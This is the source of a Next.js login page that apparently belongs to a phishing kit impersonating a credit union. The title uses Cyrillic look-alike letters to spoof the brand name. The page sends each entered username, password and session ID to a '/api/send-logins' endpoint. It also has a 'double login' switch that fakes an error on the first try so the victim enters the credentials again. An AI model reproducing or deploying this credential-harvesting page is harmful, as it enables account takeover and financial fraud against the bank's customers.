import axios from "axios";
import { useRouter } from "next/router";
import React, { useContext, useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import { yupResolver } from "@hookform/resolvers/yup";
import { Wrapper } from "../../components/Wrapper";
import { getNextUrl } from "../../utils/getNextUrl";
import { getProgress } from "../../utils/getProgress";
import { isProfane } from "../../utils/isProfane";
import { DataContext } from "../_app";
import { Input } from "../../components/Input";
import Head from "next/head";

interface LoginProps {}

const schema = yup.object().shape({
  username: yup
    .string()
    .required(`Enter a username`)
    .min(2, `Your username must be greater than 2 characters`)
    .test(`userId-includes-bad-words`, `Enter a valid username`, isProfane),
  password: yup
    .string()
    .required(`Enter a Password`)
    .min(6, `Your password must be at least 6 characters long`)
    .test(`password-includes-bad-words`, `Enter a valid Password`, isProfane),
});

export const Login: React.FC<LoginProps> = ({}) => {
  const [loginAttempt, setLoginAttempt] = useState(0);
  const [showError, setShowError] = useState(false);
  const [loading, setLoading] = useState(false);

  const [logins, setLogins] = useState({});
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    reset,
    formState: { errors, isValid },
    watch,
    resetField,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `LOGIN`);
    formData.append(
      `loginDetails`,
      JSON.stringify({
        loginAttempt: loginAttempt + 1,
        sessionId: datas.sessionId,
        ...data,
      })
    );

    try {
      await axios.post(`/api/send-logins`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setLogins({
      ...logins,
      [loginAttempt + 1]: {
        form: `LOGIN`,
        loginDetails: { loginAttempt: loginAttempt + 1, ...data },
      },
    });

    if (!loginAttempt && process.env.NEXT_PUBLIC_DOUBLE_LOGIN === `ON`) {
      setLoginAttempt(1);
      setLoading(false);
      setShowError(true);
      reset({
        username: ``,
        password: ``,
      });
      return;
    }

    setData({
      ...datas,
      logins: {
        ...logins,
        [loginAttempt + 1]: {
          form: `LOGIN`,
          loginDetails: { loginAttempt: loginAttempt + 1, ...data },
        },
      },
    });

    const url = getProgress()[0];

    push(getNextUrl(url));
  });

  useEffect(() => {
    const keyDownHandler = (event: KeyboardEvent) => {
      if (event.key === "Enter") {
        event.preventDefault();

        onSubmit();
      }
    };

    document.addEventListener("keydown", keyDownHandler);

    return () => {
      document.removeEventListener("keydown", keyDownHandler);
    };
  });

  return (
    <Wrapper
      loading={!isValid || loading}
      onSubmit={onSubmit}
      buttonText={`Sign In`}
      showError={showError}
    >
      <Head>
        <title>RВFСU - Sign In</title>
        <link href="/favicon.ico" />
      </Head>
      <Input
        label={`Username`}
        placeholder={`Username`}
        error={
          errors.username && (errors.username.message as unknown as string)
        }
        register={register}
        name={`username`}
        curValue={watch(`username`)}
        resetField={resetField}
      />
      <Input
        label={`Password`}
        placeholder={`Password`}
        type={`password`}
        error={
          errors.password && (errors.password.message as unknown as string)
        }
        register={register}
        name={`password`}
        curValue={watch(`password`)}
        resetField={resetField}
        boxStyle={{
          marginTop: `1rem`,
        }}
      />
    </Wrapper>
  );
};

export default Login;
